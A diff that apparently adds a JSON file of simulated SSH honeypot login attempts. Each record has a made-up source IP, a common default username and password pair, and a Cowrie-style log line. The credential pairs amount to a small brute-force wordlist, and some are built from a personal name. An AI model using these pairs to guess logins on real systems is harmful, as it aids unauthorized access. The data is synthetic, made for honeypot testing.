+      "raw_log": "2025-04-04T19:25:21.481827 [HoneyPotSSHTransport,0,217.215.53.132] login attempt [b'ubuntu'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "5d1d20cd0d440d666f5c46c865fae5fa"
+  },
+  "947aa8c7-929f-42b9-aa0a-528889ca2b64": {
+    "id": "947aa8c7-929f-42b9-aa0a-528889ca2b64",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:27.167582",
+    "source_ip": "95.199.4.66",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:27.167582 [HoneyPotSSHTransport,0,95.199.4.66] login attempt [b'azureuser'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "652a317f6d54e211c07122765acbac5f"
+  },
+  "8c8bd06a-3693-49a4-8035-4b5d72db1d85": {
+    "id": "8c8bd06a-3693-49a4-8035-4b5d72db1d85",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:33.484610",
+    "source_ip": "95.148.233.45",
+    "attack_type": "login_attempt",
+    "username": "tomcat",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:33.484610 [HoneyPotSSHTransport,0,95.148.233.45] login attempt [b'tomcat'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "94ac0c58c9ee355ed6832f7ac8cc89c9"
+  },
+  "7c73b991-4116-4f94-9bbe-83728a10546a": {
+    "id": "7c73b991-4116-4f94-9bbe-83728a10546a",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:39.496758",
+    "source_ip": "194.157.129.97",
+    "attack_type": "login_attempt",
+    "username": "jenkins",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:39.496758 [HoneyPotSSHTransport,0,194.157.129.97] login attempt [b'jenkins'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "4c414d3c8f6d257342b8050495e478c6"
+  },
+  "b792adb5-20ff-4aec-ad3c-e07e382b871c": {
+    "id": "b792adb5-20ff-4aec-ad3c-e07e382b871c",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:45.180626",
+    "source_ip": "185.85.115.83",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:45.180626 [HoneyPotSSHTransport,0,185.85.115.83] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "3599c62bfe58813c5e7473d30cdcb593"
+  },
+  "65f20288-7ad8-4af2-b2e5-462e8128be61": {
+    "id": "65f20288-7ad8-4af2-b2e5-462e8128be61",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:51.493331",
+    "source_ip": "8.125.213.14",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:51.493331 [HoneyPotSSHTransport,0,8.125.213.14] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "a7541736c5a1297bfe765546cdca78d2"
+  },
+  "32a6bf5b-bdbc-4b42-9ac0-e5cb560b27e8": {
+    "id": "32a6bf5b-bdbc-4b42-9ac0-e5cb560b27e8",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:18.978576",
+    "source_ip": "191.162.87.88",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "password",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:18.978576 [HoneyPotSSHTransport,0,191.162.87.88] login attempt [b'admin'/b'password'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "450a238112db765cff93342525a97dca"
+  },
+  "3011f451-cd0c-4f8f-922f-f2282302a490": {
+    "id": "3011f451-cd0c-4f8f-922f-f2282302a490",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:25.451371",
+    "source_ip": "72.154.182.57",
+    "attack_type": "login_attempt",
+    "username": "test",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:25.451371 [HoneyPotSSHTransport,0,72.154.182.57] login attempt [b'test'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "61b1d50d589a668b28234e2088b3dc8b"
+  },
+  "08e7f096-554b-4caf-969a-452991c2b9d2": {
+    "id": "08e7f096-554b-4caf-969a-452991c2b9d2",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:31.498169",
+    "source_ip": "154.22.111.67",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:31.498169 [HoneyPotSSHTransport,0,154.22.111.67] login attempt [b'user'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "4754d69abc711ffac2124574ade8379e"
+  },
+  "5597a740-ed61-4259-b749-c18f28f02da7": {
+    "id": "5597a740-ed61-4259-b749-c18f28f02da7",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:37.771856",
+    "source_ip": "1.178.192.189",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:37.771856 [HoneyPotSSHTransport,0,1.178.192.189] login attempt [b'guest'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "89191e1443b3e7da8fdbd57e462a8f16"
+  },
+  "35fcd061-9b28-4c7d-be0c-3f0bddf5005f": {
+    "id": "35fcd061-9b28-4c7d-be0c-3f0bddf5005f",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:42.526391",
+    "source_ip": "221.125.243.63",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "password",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:42.526391 [HoneyPotSSHTransport,0,221.125.243.63] login attempt [b'user'/b'password'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "8ea192b44722ff50e9cbff9c655e882a"
+  },
+  "359181a5-907a-45fd-a710-f44db068c31b": {
+    "id": "359181a5-907a-45fd-a710-f44db068c31b",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:49.759845",
+    "source_ip": "120.7.111.188",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:49.759845 [HoneyPotSSHTransport,0,120.7.111.188] login attempt [b'user'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "03adf39e615fef335828018cdf13a1a2"
+  },
+  "357b644b-1867-4d7e-b5e2-974c330e568a": {
+    "id": "357b644b-1867-4d7e-b5e2-974c330e568a",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:33:55.453393",
+    "source_ip": "177.212.218.105",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:33:55.453393 [HoneyPotSSHTransport,0,177.212.218.105] login attempt [b'guest'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "a8249c4801fa2a8a62fef349e9dc1b83"
+  },
+  "134c3864-22eb-440d-a3f0-b24b6dcd928b": {
+    "id": "134c3864-22eb-440d-a3f0-b24b6dcd928b",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:01.769606",
+    "source_ip": "33.67.33.125",
+    "attack_type": "login_attempt",
+    "username": "test",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:01.769606 [HoneyPotSSHTransport,0,33.67.33.125] login attempt [b'test'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "b954589e9b53446d7e697fbb1a1094e4"
+  },
+  "84a80ea0-b4e2-4f06-a5d7-ffb34ddb4140": {
+    "id": "84a80ea0-b4e2-4f06-a5d7-ffb34ddb4140",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:07.446908",
+    "source_ip": "220.89.226.33",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:07.446908 [HoneyPotSSHTransport,0,220.89.226.33] login attempt [b'guest'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "83bd35333a802fa8a5acae949e47e8ca"
+  },
+  "b4be8f8a-5e5e-4806-86a8-54daf52c7afa": {
+    "id": "b4be8f8a-5e5e-4806-86a8-54daf52c7afa",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:13.769838",
+    "source_ip": "86.13.234.249",
+    "attack_type": "login_attempt",
+    "username": "test",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:13.769838 [HoneyPotSSHTransport,0,86.13.234.249] login attempt [b'test'/b'qwerty'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "bb032c4e789fdea49285708091ef934e"
+  },
+  "5806ee9f-afd8-4ab3-bc55-1352d6f778b9": {
+    "id": "5806ee9f-afd8-4ab3-bc55-1352d6f778b9",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:19.776778",
+    "source_ip": "222.2.103.116",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:19.776778 [HoneyPotSSHTransport,0,222.2.103.116] login attempt [b'guest'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "e5b38031920b6e74f10a58b49c9a4ee6"
+  },
+  "e805f2e1-c502-4db0-b56b-ba4a0fef210f": {
+    "id": "e805f2e1-c502-4db0-b56b-ba4a0fef210f",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:25.462662",
+    "source_ip": "105.164.168.234",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "123456",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:25.462662 [HoneyPotSSHTransport,0,105.164.168.234] login attempt [b'admin'/b'123456'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "3604fee2db12778c9ddce56a4e7e57e3"
+  },
+  "e34f08b0-7bde-4992-b524-06f5bbd9d06a": {
+    "id": "e34f08b0-7bde-4992-b524-06f5bbd9d06a",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:31.461596",
+    "source_ip": "115.237.143.11",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:31.461596 [HoneyPotSSHTransport,0,115.237.143.11] login attempt [b'guest'/b'qwerty'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "dffa7339d510a4a8e12688979446f30e"
+  },
+  "ac046936-31e6-4f13-bb60-45d88e1e4d2b": {
+    "id": "ac046936-31e6-4f13-bb60-45d88e1e4d2b",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:37.461622",
+    "source_ip": "232.222.90.187",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "password",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:37.461622 [HoneyPotSSHTransport,0,232.222.90.187] login attempt [b'guest'/b'password'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "53fc53fa6575beb2e7f87dc0d0fc3fae"
+  },
+  "a2429759-71bc-495a-9095-1db41e4c451d": {
+    "id": "a2429759-71bc-495a-9095-1db41e4c451d",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:34:43.761205",
+    "source_ip": "13.36.129.46",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "123456",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:34:43.761205 [HoneyPotSSHTransport,0,13.36.129.46] login attempt [b'root'/b'123456'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "09c1c312af3f32f38d0ba0eb4e508844"
+  },
+  "de203fe2-f74a-4c05-b280-f36851291c39": {
+    "id": "de203fe2-f74a-4c05-b280-f36851291c39",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:35:19.375194",
+    "source_ip": "190.44.226.52",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:35:19.375194 [HoneyPotSSHTransport,0,190.44.226.52] login attempt [b'admin'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "d543cd7040fcdaec10c06eb8d8b66962"
+  },
+  "0ac57a5c-0fe2-4559-91bf-de88d370a8ee": {
+    "id": "0ac57a5c-0fe2-4559-91bf-de88d370a8ee",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:35:24.523874",
+    "source_ip": "191.61.61.251",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:35:24.523874 [HoneyPotSSHTransport,0,191.61.61.251] login attempt [b'user'/b'qwerty'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "99bae9d392a78c82a40065a7f98ecff0"
+  },
+  "99ae0219-2683-4249-bfe5-e5c875e71dd1": {
+    "id": "99ae0219-2683-4249-bfe5-e5c875e71dd1",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:35:30.518124",
+    "source_ip": "226.58.249.181",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "123456",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:35:30.518124 [HoneyPotSSHTransport,0,226.58.249.181] login attempt [b'user'/b'123456'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "1f3e7fa6fc95144d922a03d6086b8654"
+  },
+  "e988c8fb-835c-4f42-a3ea-8c4e1e4581e2": {
+    "id": "e988c8fb-835c-4f42-a3ea-8c4e1e4581e2",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:35:36.523700",
+    "source_ip": "160.34.126.203",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:35:36.523700 [HoneyPotSSHTransport,0,160.34.126.203] login attempt [b'root'/b'qwerty'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "09d4d5883d150a032563ebfe5f464e54"
+  },
+  "bd21fa35-193b-4997-ac6a-1699a828a18f": {
+    "id": "bd21fa35-193b-4997-ac6a-1699a828a18f",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:35:42.832050",
+    "source_ip": "164.128.149.25",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:35:42.832050 [HoneyPotSSHTransport,0,164.128.149.25] login attempt [b'guest'/b'qwerty'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "b4b5f655682ddc082ba8e0d793a69f27"
+  },
+  "04395395-26cd-4dd0-b5a9-ecef9a55f8ff": {
+    "id": "04395395-26cd-4dd0-b5a9-ecef9a55f8ff",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:16.232861",
+    "source_ip": "45.38.68.230",
+    "attack_type": "login_attempt",
+    "username": "test",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:16.232861 [HoneyPotSSHTransport,0,45.38.68.230] login attempt [b'test'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "d60698fa4e12683a7b300244a9ccd70e"
+  },
+  "6a70ce87-e244-4a76-8e32-bc6439c19fef": {
+    "id": "6a70ce87-e244-4a76-8e32-bc6439c19fef",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:22.216431",
+    "source_ip": "120.40.74.131",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:22.216431 [HoneyPotSSHTransport,0,120.40.74.131] login attempt [b'root'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "e739beaa18d3cd6713ace4a88fadea2a"
+  },
+  "bbf0fcb4-aa2d-4826-9ab1-0a022f3d8df3": {
+    "id": "bbf0fcb4-aa2d-4826-9ab1-0a022f3d8df3",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:28.232631",
+    "source_ip": "38.129.121.191",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:28.232631 [HoneyPotSSHTransport,0,38.129.121.191] login attempt [b'user'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "e357e4335def8f463c64f3015490598b"
+  },
+  "484763ac-18ef-4ac9-9bd1-6b0e6e14a40b": {
+    "id": "484763ac-18ef-4ac9-9bd1-6b0e6e14a40b",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:33.918198",
+    "source_ip": "113.73.205.205",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:33.918198 [HoneyPotSSHTransport,0,113.73.205.205] login attempt [b'guest'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "41b574f6528592087e869498d1064561"
+  },
+  "1c646863-947c-44b4-a11e-25768f271659": {
+    "id": "1c646863-947c-44b4-a11e-25768f271659",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:40.209569",
+    "source_ip": "253.197.126.125",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:40.209569 [HoneyPotSSHTransport,0,253.197.126.125] login attempt [b'guest'/b'qwerty'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "d6be4850414d42b80aa1f1ad15ce9842"
+  },
+  "d9668f1c-50a9-4532-ad4a-cecf15f9c5d0": {
+    "id": "d9668f1c-50a9-4532-ad4a-cecf15f9c5d0",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:45.921032",
+    "source_ip": "107.190.49.77",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:45.921032 [HoneyPotSSHTransport,0,107.190.49.77] login attempt [b'user'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "4857b910d5fbe04ca75318a8e5d95958"
+  },
+  "afaf5b36-bd2e-430d-839f-c1a17e184d80": {
+    "id": "afaf5b36-bd2e-430d-839f-c1a17e184d80",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:52.223563",
+    "source_ip": "156.149.243.83",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:52.223563 [HoneyPotSSHTransport,0,156.149.243.83] login attempt [b'admin'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "3ab31d6777d8f55ffc880d4c64e12fb0"
+  },
+  "4cd1ef93-fbec-482e-a86b-7c852724cf67": {
+    "id": "4cd1ef93-fbec-482e-a86b-7c852724cf67",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:42:58.241978",
+    "source_ip": "51.108.14.239",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:42:58.241978 [HoneyPotSSHTransport,0,51.108.14.239] login attempt [b'guest'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "44da9e34db38e86aef8a814662000387"
+  },
+  "33da7f5d-d524-447e-b1c1-6c954dedb499": {
+    "id": "33da7f5d-d524-447e-b1c1-6c954dedb499",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:43:03.916853",
+    "source_ip": "52.142.168.42",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:43:03.916853 [HoneyPotSSHTransport,0,52.142.168.42] login attempt [b'user'/b'admin'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "910741244377fc732697b25d161c58fb"
+  },
+  "861d4a57-0f27-4d62-b5fa-c3530e5f016c": {
+    "id": "861d4a57-0f27-4d62-b5fa-c3530e5f016c",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:43:10.245954",
+    "source_ip": "190.70.48.106",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "raw_log": "2025-04-08T01:43:10.245954 [HoneyPotSSHTransport,0,190.70.48.106] login attempt [b'root'/b'root'] failed",
+      "login_method": "ssh",
+      "attempts": 1
+    },
+    "attack_hash": "91818cc1e4f7b27517bb5d2eee5184eb"
+  },
+  "09879854-ca6a-4253-a44a-dafec6edafe6": {
+    "id": "09879854-ca6a-4253-a44a-dafec6edafe6",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:54:55.236843",
+    "source_ip": "217.117.100.175",
+    "attack_type": "login_attempt",
+    "username": "postgres",
+    "password": "ssh@2503",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:54:55.236843 [HoneyPotSSHTransport,0,217.117.100.175] login attempt [b'postgres'/b'ssh@2503'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "3166b5a685792ba1349a5ff8cca7d543"
+  },
+  "c68c4c17-6476-425b-a77b-71096c98a597": {
+    "id": "c68c4c17-6476-425b-a77b-71096c98a597",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:00.930811",
+    "source_ip": "176.125.78.21",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:00.930811 [HoneyPotSSHTransport,0,176.125.78.21] login attempt [b'admin'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "c8ccb930be1fd68055761429e12b6f86"
+  },
+  "8805c842-a283-4d1e-aa78-c4af5e585187": {
+    "id": "8805c842-a283-4d1e-aa78-c4af5e585187",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:06.918970",
+    "source_ip": "172.63.58.156",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:06.918970 [HoneyPotSSHTransport,0,172.63.58.156] login attempt [b'azureuser'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "1abde197983890fa03f6666145176a5f"
+  },
+  "97ec619c-8e5f-4b90-8e7b-5eaf8ff1d4be": {
+    "id": "97ec619c-8e5f-4b90-8e7b-5eaf8ff1d4be",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:13.232862",
+    "source_ip": "217.252.36.53",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:13.232862 [HoneyPotSSHTransport,0,217.252.36.53] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "054451ae7a7f1be9692ebd5ff10a7144"
+  },
+  "b751f9f8-3a60-4bb7-86ea-7ab4a6f058c9": {
+    "id": "b751f9f8-3a60-4bb7-86ea-7ab4a6f058c9",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:18.920274",
+    "source_ip": "176.49.144.122",
+    "attack_type": "login_attempt",
+    "username": "ec2-user",
+    "password": "ssh@8351",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:18.920274 [HoneyPotSSHTransport,0,176.49.144.122] login attempt [b'ec2-user'/b'ssh@8351'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "9e2329ef8b8a0b376778843fcfe4983e"
+  },
+  "c6966930-805d-4b77-b778-f0e5b9d90a08": {
+    "id": "c6966930-805d-4b77-b778-f0e5b9d90a08",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:25.227076",
+    "source_ip": "95.189.107.23",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:25.227076 [HoneyPotSSHTransport,0,95.189.107.23] login attempt [b'devraj jhala'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "cd77b3666c44850fa7d76f57b71630b0"
+  },
+  "ed966514-fafc-4852-825e-7e1583eac8ce": {
+    "id": "ed966514-fafc-4852-825e-7e1583eac8ce",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:30.921547",
+    "source_ip": "58.215.131.99",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:30.921547 [HoneyPotSSHTransport,0,58.215.131.99] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "23b495f518c3dc7568c27095546177d3"
+  },
+  "98f53b87-2954-40d4-be54-7a10c3fc5581": {
